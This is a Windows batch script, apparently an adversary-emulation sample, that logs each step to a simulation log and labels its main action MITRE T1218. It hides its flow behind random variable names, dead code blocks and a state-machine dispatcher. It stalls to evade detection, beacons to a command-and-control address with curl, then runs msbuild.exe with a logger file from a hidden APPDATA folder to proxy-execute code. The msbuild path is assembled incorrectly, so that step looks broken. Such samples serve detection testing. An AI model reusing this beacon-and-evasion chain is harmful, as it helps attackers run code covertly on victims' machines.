@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants
SET vfxcqy=%APPDATA%\8808\2d67bb1e
SET qjkqxz=https://10.0.0.49
SET wzirh=https://10.0.0.49/stage/2/icon.png?8808-10
SET xygkb=ITZEL-S2BO
SET gcnpzh=10
SET cybks=visio.txt
SET nrhds=8808

REM Log file path
SET xtqlap=!APPDATA!\!gcnpzh!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!xygkb!]: script_started=OK>> "!xtqlap!" 2>nul

REM Initial delay
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!xygkb!]: delay1_complete=45s>> "!xtqlap!" 2>nul

SET state=0
GOTO xvzqap

:bpqhgf
REM Dead code block 1
EXIT

:mfkwna
REM Real operation - C2 heartbeat
echo [%DATE% %TIME%][DEBUG][!xygkb!]: heartbeat_start>> "!xtqlap!" 2>nul
curl -k -s -o nul "!wzirh!"
echo [%DATE% %TIME%][DEBUG][!xygkb!]: heartbeat_complete>> "!xtqlap!" 2>nul

REM Random delay
SET /A dlp=%RANDOM% %% 15 + 5
timeout /t !dlp! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!xygkb!]: random_delay=!dlp!s>> "!xtqlap!" 2>nul

SET state=42
GOTO xvzqap

:tvhqjq
REM Dead code block 2
GOTO END

:yvazbn
REM Setup msbuild command
SET msb=SystemRoot
SET msb=!msb!\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
SET lgr=LoggerEntry
SET ttpresult=1
SET ttpdetails=
SET logline=[%DATE% %TIME%][!xygkb!]: !gcnpzh!-!nrhds!-T1218|Signed Binary Proxy Execution=

REM Build command
SET cmd=!msb! /logger:!lgr!,!vfxcqy!\\!cybks!;MyParameters,Foo
echo [%DATE% %TIME%][DEBUG][!xygkb!]: command_built>> "!xtqlap!" 2>nul

ping -n 8 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!xygkb!]: delay2_complete=8s>> "!xtqlap!" 2>nul

SET state=99
GOTO xvzqap

:xfhjmg
REM Dead code block 3
SET fake=data
GOTO END

:xnvjsk
REM Execute msbuild
echo [%DATE% %TIME%][DEBUG][!xygkb!]: execution_start>> "!xtqlap!" 2>nul
!cmd!
IF NOT !ERRORLEVEL!==0 (
    SET ttpresult=0
    SET ttpdetails=execution_failed
)
echo !logline!!ttpresult!:!ttpdetails!>> "!xtqlap!" 2>nul
echo [%DATE% %TIME%][DEBUG][!xygkb!]: execution_complete>> "!xtqlap!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul
echo [%DATE% %TIME%][DEBUG][!xygkb!]: delay3_complete=12s>> "!xtqlap!" 2>nul

GOTO END

:zsqpqk
REM Dead code block 4
EXIT

:xvzqap
REM Dispatch state machine
IF !state!==0 GOTO mfkwna
IF !state!==17 GOTO tvhqjq
IF !state!==42 GOTO yvazbn
IF !state!==99 GOTO xnvjsk

:END
echo [%DATE% %TIME%][DEBUG][!xygkb!]: script_ended=OK>> "!xtqlap!" 2>nul